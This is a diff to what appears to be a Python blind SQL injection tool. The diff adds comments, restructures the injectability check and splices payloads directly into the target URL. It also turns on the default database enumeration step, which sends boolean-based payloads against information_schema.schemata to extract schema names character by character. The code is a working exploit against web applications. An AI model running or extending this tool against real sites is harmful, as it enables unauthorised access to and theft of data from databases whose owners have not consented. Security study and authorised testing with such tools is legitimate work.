@@ -84,11 +84,14 @@ def first_sql_injection(url, get_param, cookies, injection_type) -> int:
     pattern = rf'\?({get_param}\=.+)(\&)'
     parameter_found = re.search(pattern, url)
     split_url = url.split(parameter_found.group(1))
+    
+    # First injection
     new_url_1 = split_url[0] + f"{get_param}={injectable_1}" + split_url[1]
     print(Fore.CYAN + f"Trying with URL: {new_url_1} ...")
     r_option_1_1 = requests.get(new_url_1, cookies=cookies).text
     answer_option_1_1 = re.search(rf'<pre>(.+)</pre>', r_option_1_1)
 
+    # Second injection
     new_url_2 = split_url[0] + f"{get_param}={injectable_2}" + split_url[1]
     print(Fore.CYAN + f"Trying with URL: {new_url_2} ...")
     r_option_1_2 = requests.get(new_url_2, cookies=cookies).text
@@ -127,11 +130,11 @@ def identify_vulnerability(url, get_param, cookies={'':''}) -> int:
     if first_sql_injection(url, get_param, cookies, 'double_quotes') == 0:
         injectable = 'double quotes'
     
-    if injectable != '':
-        print(Fore.GREEN + f"Your GET parameter `{get_param}` is injectable through {injectable}!")
-    else:
+    if injectable == '':
         print(Fore.RED + f"Your GET parameter `{get_param}` is not injectable, sorry.")
         return 1
+    
+    print(Fore.GREEN + f"Your GET parameter `{get_param}` is injectable through {injectable}!")
     return 0
 
 
@@ -157,8 +160,15 @@ def iterative_request(url, get_param, cookies, payload, is_char=False) -> int|st
         limit += 10
         for value in (string.ascii_lowercase + '_') if is_char else range(limit):
             new_payload =  str(payload.replace('iterate', '\'{}\'')).format(value) if is_char else str(payload.replace('iterate', '{}')).format(value)
-            data = { f"{get_param}": new_payload, }
-            request = requests.get(url, params=data, cookies=cookies)
+
+            pattern = rf'\?({get_param}\=.+)(\&)'
+            parameter_found = re.search(pattern, url)
+            split_url = url.split(parameter_found.group(1))
+            url_injected = split_url[0] + f"{get_param}={new_payload}" + split_url[1]
+            
+            print(Fore.CYAN + f"Trying with URL: {url_injected} ...")
+            request = requests.get(url_injected ,cookies=cookies)
+            
             if request.status_code == 200:
                 found = True
                 result_value = value
@@ -185,7 +195,7 @@ def identify_db(url, get_param, cookies):
     for i in range(n_database):
         print(Fore.LIGHTCYAN_EX + f"\t>>> Database {i+1} ...")
         if (i == 0):
-            print(Fore.YELLOW + 'Skipping INFORMATION_SCHEMA ...')
+            print(Fore.YELLOW + '\tSkipping INFORMATION_SCHEMA ...')
             continue
         payload = "1' and (select length(schema_name) from information_schema.schemata limit {},1)=iterate -- -".format(i)
         length_db = iterative_request(url, get_param, cookies, payload)
@@ -219,11 +229,11 @@ def main() -> int:
             return 1
         print(Fore.GREEN + f"Your URL is vulnerable to SQL Injection!\n")
         
-        # '''Extract information from the database (default behaviour).'''
-        # # TODO: depending on the input of the user, by default extract databases of the site
-        # identify_db(args.url, args.get_param, args.cookies)
+        '''Extract information from the database (default behaviour).'''
+        # TODO: depending on the input of the user, by default extract databases of the site
+        identify_db(args.url, args.get_param, args.cookies)
 
-        # print(Fore.GREEN + '\nDatabase recognition finished!!')
+        print(Fore.GREEN + '\nDatabase recognition finished!!')
     except Exception as err:
         print(Fore.LIGHTRED_EX + f"Unexpected {err=}, {type(err)=}")
         return 1
